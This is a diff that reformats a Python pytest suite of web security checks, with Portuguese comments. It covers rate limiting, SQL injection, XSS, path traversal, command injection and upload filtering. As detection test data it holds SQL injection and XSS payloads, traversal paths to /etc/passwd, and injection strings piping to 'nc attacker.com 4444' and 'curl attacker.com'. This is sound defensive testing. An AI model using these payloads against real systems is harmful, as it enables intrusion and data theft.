@@ -15,6 +15,7 @@ import json
 # Test: Rate Limiting
 # =============================================================================
 
+
 class TestRateLimiting:
     """Testes de rate limiting em APIs."""
 
@@ -46,7 +47,7 @@ class TestRateLimiting:
 
         requests_in_window = [
             {"timestamp": datetime.now(timezone.utc), "count": 60},
-            {"timestamp": datetime.now(timezone.utc) - timedelta(seconds=30), "count": 40}
+            {"timestamp": datetime.now(timezone.utc) - timedelta(seconds=30), "count": 40},
         ]
 
         total_requests = sum(r["count"] for r in requests_in_window)
@@ -59,10 +60,7 @@ class TestRateLimiting:
     async def test_rate_limit_by_ip(self):
         """Deve aplicar rate limit por IP."""
         client_ip = "192.168.1.100"
-        ip_limits = {
-            "192.168.1.100": 80,  # Usuário já fez 80 requisições
-            "192.168.1.101": 10
-        }
+        ip_limits = {"192.168.1.100": 80, "192.168.1.101": 10}  # Usuário já fez 80 requisições
 
         rate_limit = 100
         current = ip_limits[client_ip]
@@ -75,11 +73,7 @@ class TestRateLimiting:
     async def test_rate_limit_by_api_key(self):
         """Deve aplicar rate limit por API key."""
         api_key = "key_abc123"
-        tier_limits = {
-            "free": 100,
-            "pro": 1000,
-            "enterprise": 10000
-        }
+        tier_limits = {"free": 100, "pro": 1000, "enterprise": 10000}
 
         # Simular lookup de tier
         tier = "pro"
@@ -94,22 +88,17 @@ class TestRateLimiting:
 # Test: Input Validation
 # =============================================================================
 
+
 class TestInputValidation:
     """Testes de validação de entrada."""
 
     @pytest.mark.asyncio
     async def test_validate_json_payload(self):
         """Deve validar payload JSON válido."""
-        payload = {
-            "user_id": "123",
-            "intent": "test action",
-            "parameters": {"key": "value"}
-        }
+        payload = {"user_id": "123", "intent": "test action", "parameters": {"key": "value"}}
 
         is_valid = (
-            "user_id" in payload and
-            "intent" in payload and
-            isinstance(payload["parameters"], dict)
+            "user_id" in payload and "intent" in payload and isinstance(payload["parameters"], dict)
         )
 
         assert is_valid is True
@@ -135,7 +124,7 @@ class TestInputValidation:
         payload = {
             "user_id": "123",
             "intent": "test",
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(timezone.utc).isoformat(),
         }
 
         missing = [f for f in required_fields if f not in payload]
@@ -150,7 +139,7 @@ class TestInputValidation:
             "user_id": "123",
             "intent": "test",
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "malicious_field": "should not be here"
+            "malicious_field": "should not be here",
         }
 
         extra_fields = set(payload.keys()) - allowed_fields
@@ -183,6 +172,7 @@ class TestInputValidation:
 # Test: SQL Injection Prevention
 # =============================================================================
 
+
 class TestSQLInjectionPrevention:
     """Testes de prevenção de SQL Injection."""
 
@@ -206,15 +196,14 @@ class TestSQLInjectionPrevention:
             "admin' OR '1'='1",
             "admin'; DROP TABLE users; --",
             "1' UNION SELECT * FROM passwords--",
-            "admin'/**/OR/**/'1'='1"
+            "admin'/**/OR/**/'1'='1",
         ]
 
         sql_patterns = ["'", ";", "--", "/*", "*/", "UNION", "DROP", "OR"]
 
         for input_val in suspicious_inputs:
             contains_injection = any(
-                pattern.upper() in input_val.upper()
-                for pattern in sql_patterns
+                pattern.upper() in input_val.upper() for pattern in sql_patterns
             )
             assert contains_injection is True
 
@@ -222,6 +211,7 @@ class TestSQLInjectionPrevention:
 # =============================================================================
 # Test: XSS Prevention
 # =============================================================================
+
 
 class TestXSSPrevention:
     """Testes de prevenção de XSS."""
@@ -251,13 +241,10 @@ class TestXSSPrevention:
         dangerous_inputs = [
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')"
+            "javascript:alert('XSS')",
         ]
 
-        sanitized = [
-            i.replace("<", "&lt;").replace(">", "&gt;")
-            for i in dangerous_inputs
-        ]
+        sanitized = [i.replace("<", "&lt;").replace(">", "&gt;") for i in dangerous_inputs]
 
         for s in sanitized:
             assert "<" not in s or "&lt;" in s
@@ -266,6 +253,7 @@ class TestXSSPrevention:
 # =============================================================================
 # Test: Authentication Headers
 # =============================================================================
+
 
 class TestAuthenticationHeaders:
     """Testes de headers de autenticação."""
@@ -282,10 +270,7 @@ class TestAuthenticationHeaders:
     @pytest.mark.asyncio
     async def test_valid_bearer_token_format(self):
         """Deve validar formato Bearer token."""
-        valid_headers = [
-            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
-            "Bearer token123"
-        ]
+        valid_headers = ["Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "Bearer token123"]
 
         for header in valid_headers:
             parts = header.split()
@@ -304,16 +289,14 @@ class TestAuthenticationHeaders:
         ]
 
         for header in invalid_headers:
-            is_valid_bearer = (
-                header.startswith("Bearer ") and
-                len(header) > 7
-            )
+            is_valid_bearer = header.startswith("Bearer ") and len(header) > 7
             assert is_valid_bearer is False
 
 
 # =============================================================================
 # Test: Path Traversal Prevention
 # =============================================================================
+
 
 class TestPathTraversalPrevention:
     """Testes de prevenção de path traversal."""
@@ -325,16 +308,13 @@ class TestPathTraversalPrevention:
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32",
             "....//....//....//etc/passwd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL encoded
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
         ]
 
         traversal_patterns = ["../", "..\\", "%2e%2e"]
 
         for path in malicious_paths:
-            is_traversal = any(
-                pattern in path.lower()
-                for pattern in traversal_patterns
-            )
+            is_traversal = any(pattern in path.lower() for pattern in traversal_patterns)
             assert is_traversal is True
 
     @pytest.mark.asyncio
@@ -357,6 +337,7 @@ class TestPathTraversalPrevention:
 # Test: Command Injection Prevention
 # =============================================================================
 
+
 class TestCommandInjectionPrevention:
     """Testes de prevenção de command injection."""
 
@@ -369,16 +350,13 @@ class TestCommandInjectionPrevention:
             "file.txt | nc attacker.com 4444",
             "file.txt; curl attacker.com",
             "$(whoami)",
-            "`id`"
+            "`id`",
         ]
 
         dangerous_chars = [";", "&", "|", "$(", "`", "\n", "\r"]
 
         for input_val in malicious_inputs:
-            is_dangerous = any(
-                char in input_val
-                for char in dangerous_chars
-            )
+            is_dangerous = any(char in input_val for char in dangerous_chars)
             assert is_dangerous is True
 
     @pytest.mark.asyncio
@@ -388,6 +366,7 @@ class TestCommandInjectionPrevention:
 
         # Uso correto: lista de argumentos, não string
         import subprocess
+
         args = ["cat", user_input]
 
         # subprocess.run com lista é seguro contra shell injection
@@ -399,17 +378,14 @@ class TestCommandInjectionPrevention:
 # Test: Sensitive Data Exposure
 # =============================================================================
 
+
 class TestSensitiveDataExposure:
     """Testes de exposição de dados sensíveis."""
 
     @pytest.mark.asyncio
     async def test_redact_password_in_logs(self):
         """Deve mascarar senha em logs."""
-        log_data = {
-            "username": "user123",
-            "password": "secret123",
-            "email": "user@example.com"
-        }
+        log_data = {"username": "user123", "password": "secret123", "email": "user@example.com"}
 
         # Mascarar campos sensíveis
         safe_log = log_data.copy()
@@ -427,14 +403,11 @@ class TestSensitiveDataExposure:
             "email": "user@example.com",
             "password_hash": "abcedf123",
             "ssn": "123-45-6789",
-            "api_key": "key_secret"
+            "api_key": "key_secret",
         }
 
         public_fields = {"user_id", "email"}
-        response = {
-            k: v for k, v in internal_data.items()
-            if k in public_fields
-        }
+        response = {k: v for k, v in internal_data.items() if k in public_fields}
 
         assert "password_hash" not in response
         assert "ssn" not in response
@@ -445,6 +418,7 @@ class TestSensitiveDataExposure:
 # =============================================================================
 # Test: HTTP Security Headers
 # =============================================================================
+
 
 class TestHTTPSecurityHeaders:
     """Testes de headers de segurança HTTP."""
@@ -484,6 +458,7 @@ class TestHTTPSecurityHeaders:
 # Test: File Upload Security
 # =============================================================================
 
+
 class TestFileUploadSecurity:
     """Testes de segurança em upload de arquivos."""
 
@@ -517,17 +492,16 @@ class TestFileUploadSecurity:
             "script.jsp",
             "exploit.asp",
             ".htaccess",
-            "web.config"
+            "web.config",
         ]
 
         dangerous_extensions = {".php", ".jsp", ".asp", ".htaccess"}
         traversal_patterns = {"..", "/"}
 
         for filename in malicious_filenames:
-            is_dangerous = (
-                any(filename.lower().endswith(ext) for ext in dangerous_extensions) or
-                any(pattern in filename for pattern in traversal_patterns)
-            )
+            is_dangerous = any(
+                filename.lower().endswith(ext) for ext in dangerous_extensions
+            ) or any(pattern in filename for pattern in traversal_patterns)
             # Deve detectar pelo menos um padrão
             if is_dangerous:
                 assert True
@@ -538,6 +512,7 @@ class TestFileUploadSecurity:
 # =============================================================================
 # Test: Mass Assignment Prevention
 # =============================================================================
+
 
 class TestMassAssignmentPrevention:
     """Testes de prevenção de mass assignment."""
@@ -551,7 +526,7 @@ class TestMassAssignmentPrevention:
             "email": "user@example.com",
             "bio": "My bio",
             "is_admin": True,  # Campo não permitido
-            "role": "superuser"  # Campo não permitido
+            "role": "superuser",  # Campo não permitido
         }
 
         filtered = {k: v for k, v in user_input.items() if k in whitelist}
@@ -568,7 +543,7 @@ class TestMassAssignmentPrevention:
             "username": "user123",
             "email": "user@example.com",
             "is_admin": True,
-            "credit_card": "1234-5678-9012-3456"
+            "credit_card": "1234-5678-9012-3456",
         }
 
         filtered = {k: v for k, v in user_input.items() if k not in blacklist}
